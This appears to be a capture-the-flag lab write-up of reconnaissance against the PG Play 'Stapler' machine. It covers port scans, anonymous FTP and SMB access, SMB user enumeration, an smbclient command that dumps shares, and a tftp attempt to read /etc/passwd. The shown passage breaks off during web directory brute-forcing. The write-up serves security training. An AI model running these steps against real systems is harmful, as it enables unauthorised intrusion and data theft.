---
render_with_liquid: false
title: PG Play  Stapler
date: 2024-01-05 15:08:44 +1400
tags: [pg-play, nmap, linux, autorecon, feroxbuster, enum4linux, smb, hydra, password-spraying, weak-credentials, bash-script, sambacry, discover-history, sudo]
---



# Learnt / Summary

- 

# Recon

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ pt init '192.168.205.148 stapler'
+---------+--------+-----------------+---------+
| PROFILE | STATUS |       IP        | DOMAIN  |
+---------+--------+-----------------+---------+
| stapler | on     | 192.168.205.148 | stapler |
+---------+--------+-----------------+---------+
```

## Autorecon

```bash
sudo $(which autorecon) -vv --dirbuster.wordlist="/usr/share/seclists/Discovery/Web-Content/big.txt" stapler
```

## Nmap


### TCP

```ruby

# Nmap 7.94SVN scan initiated Fri Jan  5 15:08:44 2024 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,53,80,139,666,3306,12380 Stapler
Nmap scan report for Stapler (192.168.176.148)
Host is up, received user-set (0.28s latency).
Scanned at 2024-01-05 15:08:44 CST for 50s

PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 61 vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.45.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc/xrBbi5hixT2B19dQilbbrCaRllRyNhtJcOzE8x0BM1ow9I80RcU7DtajyqiXXEwHRavQdO+/cHZMyOiMFZG59OCuIouLRNoVO58C91gzDgDZ1fKH6BDg+FaSz+iYZbHg2lzaMPbRje6oqNamPR4QGISNUpxZeAsQTLIiPcRlb5agwurovTd3p0SXe0GknFhZwHHvAZWa2J6lHE2b9K5IsSsDzX2WHQ4vPb+1DzDHV0RTRVUGviFvUX1X5tVFvVZy0TTFc0minD75CYClxLrgc+wFLPcAmE2C030ER/Z+9umbhuhCnLkLN87hlzDSRDPwUjWr+sNA3+7vc/xuZul
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQB5n5kAZPIyHb9lVx1aU0fyOXMPUblpmB8DRjnP8tVIafLIWh54wmTFVd3nCMr1n5IRWiFeX1weTBDSjjz0IY=
|   256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ9wvrF4tkFMApswOmWKpTymFjkaiIoie4QD0RWOYnny
53/tcp    open  tcpwrapped  syn-ack ttl 61
80/tcp    open  http        syn-ack ttl 61 PHP cli server 5.5 or later
|_http-title: 404 Not Found
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open  doom?       syn-ack ttl 61
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open  mysql       syn-ack ttl 61 MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 43
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Support41Auth, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, LongPassword, Speaks41ProtocolNew, InteractiveClient, ODBCClient, FoundRows, SupportsCompression, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ?\eV\x12zEp\x10\\x17WK\x1C4\x15'^\x04.
|_  Auth Plugin Name: mysql_native_password
12380/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.94SVN%I=7%D=1/5%Time=6597AAFD%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\
SF:x152\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\
SF:x04\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\
SF:xa2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa
SF:2\x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f
SF:\xb2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xa
SF:eu\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\
SF:xd3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\
SF:xa0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[
SF:\x87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b
SF:\xf4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0
SF:\xdc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\
SF:xd5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\
SF:xaf\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe
SF:2:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1b
SF:k\x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xc
SF:c\xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\x
SF:fd\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xc
SF:c\x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb
SF:0\xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[
SF:r\xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xa
SF:ak\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7f
SF:y\xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x
SF:7f\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xc
SF:b\[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9
SF:\xcc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\
SF:xa7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x8
SF:1\xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\
SF:x96\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x
SF:8f\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\x
SF:f4\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xc
SF:d\x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\
SF:xbcL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\x
SF:f0\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x0
SF:4\xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ
SF:\xf3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x1
SF:1\?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 1s, median: 0s
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 43102/tcp): CLEAN (Timeout)
|   Check 2 (port 32808/tcp): CLEAN (Timeout)
|   Check 3 (port 60628/udp): CLEAN (Failed to receive data)
|   Check 4 (port 52575/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-01-05T07:08:59
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2024-01-05T07:08:59+00:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Jan  5 15:09:34 2024 -- 1 IP address (1 host up) scanned in 50.05 seconds
```

### UDP

```ruby

# Nmap 7.94SVN scan initiated Sun Jan  7 04:00:59 2024 as: nmap -vv --reason -Pn -T4 -sU -sVC --top-ports 100 -oA ./nmap/top_100_udp stapler
Increasing send delay for 192.168.205.148 from 0 to 50 due to 11 out of 15 dropped probes since last increase.
Warning: 192.168.205.148 giving up on port because retransmission cap hit (6).
Increasing send delay for 192.168.205.148 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 192.168.205.148 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for stapler (192.168.205.148)
Host is up, received user-set (0.28s latency).
Scanned at 2024-01-07 04:00:59 CST for 263s
Not shown: 88 closed udp ports (port-unreach)
PORT      STATE         SERVICE     REASON              VERSION
53/udp    open|filtered domain      no-response
68/udp    open|filtered dhcpc       no-response
69/udp    open          tftp        script-set          Netkit tftpd or atftpd
| tftp-version:
|   cpe:
|     cpe:/a:netkit:netkit
|     cpe:/a:lefebvre:atftpd
|_  p: Netkit tftpd or atftpd
137/udp   open          netbios-ns  udp-response ttl 61 Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: RED
|   interfaces:
|_    192.168.205.148
138/udp   open|filtered netbios-dgm no-response
623/udp   open|filtered asf-rmcp    no-response
4500/udp  open|filtered nat-t-ike   no-response
32815/udp open|filtered unknown     no-response
33281/udp open|filtered unknown     no-response
49182/udp open|filtered unknown     no-response
49191/udp open|filtered unknown     no-response
49200/udp open|filtered unknown     no-response
Service Info: Host: RED

Host script results:
| nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   RED<00>              Flags: <unique><active>
|   RED<03>              Flags: <unique><active>
|   RED<20>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Jan  7 04:05:22 2024 -- 1 IP address (1 host up) scanned in 263.32 seconds
```

## 21 - vsftpd 2.0.8 (or vsFTPd 3.0.3?)

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler/dump/ftp]
└─$ ftp ftp://anonymous:''@stapler
Connected to stapler.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls -la
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 04  2016 .
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ..
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
100% |********************************************************************************************************************************************************************|   107        2.75 MiB/s    00:00 ETA
226 Transfer complete.
107 bytes received in 00:00 (0.37 KiB/s)
ftp> put test
local: test remote: test
200 PORT command successful. Consider using PASV.
550 Permission denied.
```

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler/dump/ftp]
└─$ cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```


## 80 - HTTP : PHP page without index.php

![](/assets/obsidian/ce65ccfa7c95fdb5ce59e8a24ca1d782.png)

```ruby
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ feroxbuster -t 100 -k -o 'ferox_80.txt' -u 'http://stapler/' -x php -w /usr/share/seclists/Discovery/Web-Content/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://stapler/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       57w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      117l      518w     3771c http://stapler/.bashrc
200      GET       22l      109w      675c http://stapler/.profile
[####################] - 6m     20477/20477   0s      found:2       errors:332
[####################] - 6m     20477/20477   58/s    http://stapler/
```

```ruby
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ feroxbuster -t 100 -k -o ferox_80_large_files.txt -u 'http://stapler/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://stapler/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80_large_files.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       57w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      117l      518w     3771c http://stapler/.bashrc
200      GET        7l       35w      220c http://stapler/.bash_logout
404      GET        0l        0w      546c http://stapler/cs_popup.aspx
200      GET       22l      109w      675c http://stapler/.profile
```

## 139 - Samba smbd 4.3.9


### Enum4linux

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ enum4linux -a -A stapler
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jan  8 19:50:33 2024

 =========================================( Target Information )=========================================

Target ........... stapler
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==============================( Enumerating Workgroup/Domain on stapler )==============================


[+] Got domain/workgroup name: WORKGROUP


 ==================================( Nbtstat Information for stapler )==================================

Looking up status of 192.168.227.148
        RED             <00> -         H <ACTIVE>  Workstation Service
        RED             <03> -         H <ACTIVE>  Messenger Service
        RED             <20> -         H <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         H <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================( Session Check on stapler )======================================


[+] Server stapler allows sessions using username '', password ''


 ===================================( Getting domain SID for stapler )===================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 =====================================( OS information on stapler )=====================================


[E] Can't get OS info with smbclient


[+] Got OS info for stapler from srvinfo:
        RED            Wk Sv PrQ Unx NT SNT red server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ==========================================( Users on stapler )==========================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ====================================( Share Enumeration on stapler )====================================


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            RED

[+] Attempting to map shares on stapler

//stapler/print$        Mapping: DENIED Listing: N/A Writing: N/A
testing write access kathy
//stapler/kathy Mapping: OK Listing: OK Writing: DENIED
testing write access tmp
//stapler/tmp   Mapping: OK Listing: OK Writing: OK

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//stapler/IPC$  Mapping: N/A Listing: N/A Writing: N/A

 ==============================( Password Policy Information for stapler )==============================



[+] Attaching to stapler using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] RED
        [+] Builtin

[+] Password Info for Domain: RED

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 =========================================( Groups on stapler )=========================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 =====================( Users on stapler via RID cycling (RIDS: 500-550,1000-1050) )=====================


[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''

S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)

 ==================================( Getting printer info for stapler )==================================

No printers returned.


enum4linux complete on Mon Jan  8 20:14:04 2024
```

### SMB

Dump files

```bash
folders=(tmp kathy); for f in $folders; do mkdir -p loot/smb/$f && smbclient "//stapler/$f" -U '%' -c "lcd loot/smb/$f; mask \"\"; recurse ON; prompt OFF; mget *"; done
```

Checked the files, nothing interesting

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ ctree loot/smb
Permissions Size User     Date Modified Name
drwxr-xr-x     - bravosec  8 Jan 20:28  loot/smb
drwxr-xr-x     - bravosec  8 Jan 20:28  ├── tmp
.rw-r--r--     0 bravosec  8 Jan 20:28  │  └── id
drwxr-xr-x     - bravosec  8 Jan 20:28  └── kathy
drwxr-xr-x     - bravosec  8 Jan 20:28     ├── kathy_stuff
.rw-r--r--    64 bravosec  8 Jan 20:28     │  └── todo-list.txt
drwxr-xr-x     - bravosec  8 Jan 20:29     └── backup
.rw-r--r--  6.0k bravosec  8 Jan 20:29        ├── vsftpd.conf
.rw-r--r--  6.3M bravosec  8 Jan 20:29        └── wordpress-4.tar.gz
```

## 666 - Zip file

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler/dump]
└─$ nc stapler 666 > 666.tcp

┌──(bravosec㉿fsociety)-[~/pgplay/Stapler/dump]
└─$ file 666.tcp
666.tcp: Zip archive data, at least v2.0 to extract, compression method=deflate

┌──(bravosec㉿fsociety)-[~/pgplay/Stapler/dump]
└─$ 7z l 666.tcp
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2016-06-03 23:03:07 .....        12821        11434  message2.jpg
------------------- ----- ------------ ------------  ------------------------
2016-06-03 23:03:07              12821        11434  1 files

┌──(bravosec㉿fsociety)-[~/pgplay/Stapler/dump]
└─$ 7z x 666.tcp -o'666'

┌──(bravosec㉿fsociety)-[~/pgplay/Stapler/dump]
└─$ cd 666

┌──(bravosec㉿fsociety)-[~/pgplay/Stapler/dump/666]
└─$ exiftool message2.jpg
ExifTool Version Number         : 12.67
File Name                       : message2.jpg
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2016:06:03 23:03:07+08:00
File Access Date/Time           : 2024:01:07 02:33:39+08:00
File Inode Change Date/Time     : 2024:01:07 02:33:39+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 72
Y Resolution                    : 72
Current IPTC Digest             : 020ab2da2a37c332c141ebf819e37e6d
Contact                         : If you are reading this, you should get a cookie!
Application Record Version      : 4
IPTC Digest                     : d41d8cd98f00b204e9800998ecf8427e
Warning                         : IPTCDigest is not current. XMP may be out of sync
Image Width                     : 364
Image Height                    : 77
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 364x77
Megapixels                      : 0.028
```

![](/assets/obsidian/12ca1ec747e3b632b6ed0e2cd2c51636.png)

## 699 (UDP) - tftp

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ tftp stapler
tftp> get /etc/passwd
Error code 1: File not found
tftp> get .bashrc
Error code 1: File not found
tftp> put test
tftp>
```

```bash
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ curl http://stapler/test
<!doctype html><html><head><title>404 Not Found</title><style>
body { background-color: #fcfcfc; color: #333333; margin: 0; padding:0; }
h1 { font-size: 1.5em; font-weight: normal; background-color: #9999cc; min-height:2em; line-height:2em; border-bottom: 1px inset black; margin: 0; }
h1, p { padding-left: 10px; }
code.url { background-color: #eeeeee; font-family:monospace; padding:0 2px;}
</style>
</head><body><h1>Not Found</h1><p>The requested resource <code class="url">/test</code> was not found on this server.</p></body></html> 

┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ curl http://Stapler:12380/test
[...]
<!doctype html>
<html lang="en">
<head>
<!-- Credit: http://www.creative-tim.com/product/coming-sssoon-page -->
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />
    <title>Tim, we need to-do better next year for Initech</title>
[...]
```

## 12380 - HTTP : Site in progress

![](/assets/obsidian/e142639133e0cce2239e31c27e7dbf77.png)

```ruby
┌──(bravosec㉿fsociety)-[~/pgplay/Stapler]
└─$ feroxbuster -u http://Stapler:12380 -t 100 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x "txt,html,php" -k -n -r -o ferox_12380.txt -C 400

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
